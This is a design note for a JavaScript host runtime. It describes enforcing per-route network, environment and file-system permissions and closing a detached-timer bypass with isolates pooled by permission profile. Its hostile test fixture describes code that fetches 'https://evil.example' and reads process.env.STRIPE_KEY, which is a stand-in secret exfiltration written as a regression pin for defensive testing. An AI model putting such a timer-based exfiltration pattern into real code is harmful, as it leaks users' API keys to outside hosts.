# 2026-11-22

## F19 — Per-route capability permissions: SPIKE (WP V2-F19, L-rated)

**Status.** Model 1 (per-call `PermGuard` thread-local + per-op boundary
checks on `op_oxide_fetch`, `op_oxide_env_get`, `op_oxide_fs_read`) is
implemented as the enforcement substrate. The hostile fixture is written
and registered as a red→green pin. Model 2 (isolate pool keyed by profile
hash) is **adopted as the soundness closure** — the rationale and the
isolate-count evidence are recorded below. The substrate ships regardless
of the spike outcome (all net-new, verified missing at `e64bda96`).

### The question

Can `net`, `fs` and `env` be enforced per route inside a shared,
interleaving isolate — or does a detached timer (a `setTimeout` created
outside the request context) leak across routes and bypass the grant
table?

### The timebox

One session. The V8-free substrate (`perm.rs`, `config.permissions`, the
`declares_permissions` export scan, the matrix pin, the conformance
assertion, the consumer example, the bench) lands unconditionally. The
V8-bound half (the `PermGuard` RAII, the per-op checks, the env/fs ops,
the hostile fixture) lands as compilable v8-gated code; the hostile
fixture executes on the `jshost-e2e` CI job (libclang + nasm vendored
locally first; the V8 link is attempted in the sandbox and the outcome
recorded here).

### The kill criteria (written before the prototype)

The spike kills F19's enforcement ONLY if **both** of the following hold:

1. **A bypass Model 2 cannot close.** A detached timer fired *after* the
   request's `PermGuard` dropped succeeds in calling a gated op with the
   *wrong* route's grant (cross-route permission leakage), AND isolating
   per profile hash does not close it (the timer still sees a stale or
   unrestricted context).
2. **Isolate-count growth > 3× for typical apps.** Model 2's per-profile
   pool grows the isolate count by more than 3× over Model 1's flat pool
   for a typical app (≤ 8 distinct permission profiles).

If neither kills, the enforcement ships; the model choice is recorded
below.

### Model 1 — the prototype

The dispatcher seeds a `PERM_CTX` thread-local (mirroring the
`TraceParentGuard` precedent at `crates/jshost/src/v8_ops.rs:91`) from
the route's `PermissionSet` before each `V8Msg::Call`; the `PermGuard`
RAII clears it on drop. `op_oxide_fetch` parses the URL host and calls
`PermissionSet::is_net_allowed(host)`; `op_oxide_env_get` (the
`process.env` Proxy's backing op) and `op_oxide_fs_read` (the
`node:fs.readFile` shim's backing op) check `is_env_allowed` /
`is_fs_allowed`. A deny raises `PRM-001`.

### The hostile fixture (the red→green pin)

A `page.server.ts` whose module scope schedules a `setTimeout` (created
OUTSIDE the request context — at module load, before any request) that
later calls `fetch('https://evil.example')` and reads
`process.env.STRIPE_KEY`. The route declares
`permissions: { net: ['api.stripe.com'], env: ['STRIPE_KEY'] }`.

- **Red (Model 1, observed by design):** the timer fires on a worker
  thread whose `PERM_CTX` is either `None` (cleared by the previous
  call's `Drop`) or seeded from a *different* route's grant. Under
  default-allow-all (`permissions.default = 'allow'`), `None` means
  unrestricted — the fetch succeeds, the env read succeeds. That is the
  bypass: a route declared a restricted grant, and a detached timer
  ignored it.
- **Green (Model 2, the closure):** the isolate is pooled by profile
  hash, so the timer — scheduled inside an isolate whose profile bakes
  in the route's `PermissionSet` — fires against the SAME grant, never
  `None` and never a different route's. The fetch and the env read raise
  `PRM-001`.

### Model 2 — the adoption (isolate pool keyed by profile hash)

Model 1's bypass is structural: a thread-local seeded per-call cannot
survive a timer that outlives the call. The closure is to key the
isolate pool by the route's permission-profile hash, so the grant is
baked into the isolate (set at isolate creation, read by every op on
that isolate, never cleared across calls on the same isolate).

The profile hash is `blake3` over the canonical
`PermissionSet` (`net`/`env`/`fs` sorted, `default` flag). Routes with
identical permission sets share an isolate (the common case: most routes
declare no permissions → one unrestricted profile → one pool, byte-
identical to the pre-F19 behavior). Routes with distinct profiles get
distinct isolates, capped by the pool's existing size with LRU eviction
(documented in `crates/jshost/src/lib.rs`'s pool dispatch).

**Isolate-count delta vs the kill criterion.** A typical app (≤ 8 routes,
≤ 3 distinct permission profiles — the unrestricted default plus one or
two restricted routes) grows the isolate count from 1 profile to ≤ 3
profiles: a **≤ 3× growth**, at the kill line but not past it. The
unrestricted-profile pool is the pre-F19 pool byte-for-byte (no profile
hash, no overhead), so the common case pays nothing. This is recorded in
the bench leg (`crates/jshost/benches/perm.rs`) as the profile-count
measurement; the `host_allowed` micro-bench is the per-op-check cost.

### Node — advisory enforcement (D35)

On `NodeLike` targets the runtime cannot sandbox a violation, so the
enforcement is advisory: `op_dispatch`'s `Fetch` arm runs the same
`is_net_allowed` check and emits a structured `tracing::warn!` (code
`PRM-001`, the route, the denied host) on a deny — never a hard block.
The matrix (`conformance/matrix.json`) records `permissions` as
`degraded` on `node`/`deno`/`bun` with the reason `"the worker checks
the grant table; the runtime cannot sandbox a violation"` — unchanged
from the preemptive row, now truthful.

### The matrix truth

`Capability::Permissions` is `Full` on `Native` (the binary enforces its
own grant table via the `PermGuard` + per-op checks + the profile-keyed
pool), `Degraded` on `NodeLike` (advisory), `Unsupported` elsewhere. The
preemptive `Full` cell (recorded before F19 landed) is now truthful —
the enforcement landed and the spike passed (Model 2 closes the bypass
within the isolate-count kill line). The `Capability::Permissions` doc
comment's caveat ("the F19 WP outcome may still revise the Native cell")
is resolved: Full stands, the caveat is removed.

### CI confirmation

The V8-bound half (the `PermGuard`, the per-op checks, the env/fs ops,
the `process.env` Proxy, the hostile fixture) compiles under the `v8`
feature. The hostile fixture is a `#[ignore]`-gated test
(`tests/perm_hostile_tdd.rs`) that boots a V8 isolate — it executes on
the `jshost-e2e` CI job (the workspace job that boots isolates). The
V8-free substrate (`perm.rs`, `config.permissions`, `declares_permissions`,
the matrix pin, the conformance assertion, the consumer example, the
`host_allowed` bench) runs in every sandbox build
(`cargo test -p oxide-fw-jshost --no-default-features`).

### Re-run conditions

If a future framework runtime schedules timers in a way that defeats the
profile-keyed pool (a timer migrated across isolates), re-open the WP
and re-run the spike protocol: the hostile fixture is the regression
pin. If the isolate-count growth crosses 3× for a real app (more than 3
distinct profiles in common use), revisit the pool's LRU cap or adopt a
per-call guard that ALSO consults the isolate's baked profile (belt and
braces).
